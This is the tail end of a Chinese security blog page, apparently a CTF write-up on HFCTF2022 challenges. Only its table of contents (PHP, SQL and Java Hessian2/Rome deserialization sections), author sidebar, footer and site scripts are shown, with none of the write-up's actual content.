          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#HFCTF2022%E5%9D%90%E7%89%A2%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.</span> <span class="nav-text">HFCTF2022坐牢复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ezphp"><span class="nav-number">1.1.</span> <span class="nav-text">ezphp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-sql"><span class="nav-number">1.2.</span> <span class="nav-text">baby_sql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-chain"><span class="nav-number">1.3.</span> <span class="nav-text">ez_chain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87hashCode"><span class="nav-number">1.3.1.</span> <span class="nav-text">过hashCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hessian2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.2.</span> <span class="nav-text">Hessian2 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.3.</span> <span class="nav-text">Rome反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#templatesImpl%E4%B8%8D%E8%83%BD%E7%94%A8"><span class="nav-number">1.3.4.</span> <span class="nav-text">templatesImpl不能用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">1.3.5.</span> <span class="nav-text">二次反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%98%BE"><span class="nav-number">1.3.6.</span> <span class="nav-text">回显</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91"><span class="nav-number">1.3.7.</span> <span class="nav-text">坑</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Z3ratu1" src="https://q2.qlogo.cn/headimg_dl?dst_uin=1207039417&spec=160">
  <p class="site-author-name" itemprop="name">Z3ratu1</p>
  <div class="site-description" itemprop="description">与其感慨路难行，不如现在出发</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">163</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">90</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        
  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="external nofollow noopener noreferrer" target="_blank">湘ICP备2020021580号 </a>
      <img src="/./images/beian.png" style="display: inline-block;">
  </div>

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Z3ratu1</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="external nofollow noopener noreferrer" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : '7H8kg0XdWO8IbhOcu4K1JaAT-gzGzoHsz',
      appKey     : 'wPKQjkbVtvPaRR7gh2yjfLSi',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
